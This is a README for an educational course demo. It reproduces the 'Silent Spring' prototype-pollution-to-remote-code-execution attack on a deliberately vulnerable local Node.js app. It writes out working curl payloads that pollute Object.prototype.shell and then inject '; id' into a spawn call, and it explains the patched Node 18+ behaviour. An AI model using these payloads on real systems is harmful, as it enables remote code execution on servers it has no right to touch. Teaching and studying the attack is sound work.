# Silent Spring — Prototype Pollution → RCE (Educational Demo)

A small, **Docker-free** reproduction of the core attack from:

> **Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js**
> Mikhail Shcherbakov, Musard Balliu (KTH), Cristian-Alexandru Staicu (CISPA).
> *32nd USENIX Security Symposium, 2023.*
> <https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov>

Built for a network-security course. It does **not** re-implement the paper's
CodeQL static-analysis framework. Instead it demonstrates, hands-on, the paper's
central insight: a **prototype-based object injection vulnerability (POIV)** can
turn a *safe-looking* `child_process.spawn` call into remote code execution via a
**universal gadget** that ships inside Node.js itself.

---

## The attack in one picture

```
 Attacker HTTP request                 Node.js process
 ─────────────────────                 ───────────────
 POST /api/settings                    Stage 1: INJECTION SINK
 {"constructor":                        lodash defaultsDeep() merges attacker
   {"prototype":                        keys → writes Object.prototype.shell = true
     {"shell": true}}}          ┌────►  (every object in the runtime is now affected)
                                │
 GET /api/ping?host=127.0.0.1; id       Stage 2: UNIVERSAL GADGET
                                └────►  spawn('ping', ['-c','1', host])
                                        Node reads options.shell — MISSING on the
                                        options object, so it inherits the polluted
                                        `true` from the prototype → command runs
                                        through /bin/sh -c → `; id` executes.  RCE.
```

The two dangerous lines live in *different, individually-reasonable* functions.
Neither looks wrong on its own — that is exactly why the paper needed taint
analysis to connect the injection sink to the gadget.

---

## Quick start

```bash
cd silent-spring-demo
bash scripts/setup.sh     # npm install + fetch Node 16.13.1 into vendor/ (one time)
npm run demo              # runs the whole attack, writes everything to results/
```

`npm run demo` runs the identical exploit against the **same app** on two runtimes
and saves a full transcript + evidence to [`results/`](results/):

| Runtime | Result |
|---|---|
| **Node 16.13.1** (the paper's version) | RCE succeeds ✅ |
| **Your system Node** (v18+) | mitigated ❌ (see note below) |

Open [`results/SUMMARY.md`](results/SUMMARY.md) after the run.

### Try it by hand / show the web UI

```bash
# Vulnerable runtime (paper's version):
PORT=3000 ./vendor/node-v16.13.1-darwin-arm64/bin/node src/server.js
# then browse http://127.0.0.1:3000  (SysMon dashboard)
```

```bash
# 1) baseline: injection is harmless because spawn gets an argv array
curl "http://127.0.0.1:3000/api/ping?host=127.0.0.1;%20id"

# 2) Stage 1 — pollute the prototype
curl -X POST -H 'Content-Type: application/json' \
     -d '{"constructor":{"prototype":{"shell":true}}}' \
     http://127.0.0.1:3000/api/settings

# 3) Stage 2 — same endpoint now yields RCE
curl "http://127.0.0.1:3000/api/ping?host=127.0.0.1;%20id"   # -> uid=... appears
```

---

## Project layout

```
silent-spring-demo/
├── src/
│   ├── server.js            # the deliberately-vulnerable "SysMon" app (heavily commented)
│   └── public/index.html    # dashboard UI (nice for a live demo / screenshot)
├── scripts/
│   ├── setup.sh             # npm install + local Node 16.13.1 (no Docker, no system change)
│   ├── run-demo.sh          # automated end-to-end attack; logs everything to results/
│   └── probe-gadget.js      # 30-line standalone proof of the gadget (run on any Node)
├── docs/
│   ├── PRESENTATION.md      # slide-by-slide talking points
│   └── PAPER-NOTES.md       # summary of the paper, mapped to this demo
├── results/                 # generated evidence (transcripts, logs, proof file)
└── vendor/                  # local Node 16.13.1 (created by setup.sh, git-ignored)
```

---

## Why the system Node is "mitigated"

The paper targeted Node **16.13.1**. Since then, Node hardened the internal
`child_process` gadget by using a **null-prototype** object for default spawn
options, so a polluted `Object.prototype.shell` is no longer inherited by that
internal object. Running the exact same exploit on Node 18+ therefore fails.

This is itself a useful lesson for the presentation: the vulnerability class is
real and was exploitable in shipping runtimes, and **keeping runtimes patched**
closes this particular universal gadget — though application-level gadgets (the
paper's Listing 2 pattern, `options.cmd || default`) remain the developer's
responsibility on every Node version.

---

## Safety / ethics

This app is **intentionally insecure** and binds only to `127.0.0.1`. The "RCE"
payloads used here are benign (`id`, and creating an empty `results/RCE_PROOF.txt`
marker) purely to *prove* code execution. Do not deploy this server or point the
technique at systems you do not own. For educational use in the course only.
